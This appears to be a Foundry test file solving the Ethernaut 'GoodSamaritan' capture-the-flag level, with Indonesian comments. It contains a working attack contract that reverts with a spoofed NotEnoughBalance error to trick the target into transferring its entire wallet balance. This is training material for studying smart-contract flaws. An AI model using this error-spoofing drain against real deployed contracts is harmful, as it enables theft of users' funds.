// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {GoodSamaritan} from "src/levels/GoodSamaritan.sol";
import {GoodSamaritanFactory} from "src/levels/GoodSamaritanFactory.sol";

// notify() revert dengan error NotEnoughBalance() PERSIS pada panggilan
// pertama (donate10, amount == 10): requestDonation menangkap error itu
// dan memanggil transferRemainder -> seluruh saldo wallet mengalir.
// Panggilan kedua (transferRemainder): jangan revert.
error NotEnoughBalance();

contract GoodSamaritanAttack {
    GoodSamaritan public target;

    constructor(address _target) {
        target = GoodSamaritan(_target);
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        target.requestDonation();
    }
}

contract GoodSamaritanSolve is Test {
    GoodSamaritanFactory factory;
    GoodSamaritan instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new GoodSamaritanFactory();
        instance = GoodSamaritan(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        GoodSamaritanAttack attack = new GoodSamaritanAttack(address(instance));
        attack.attack();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
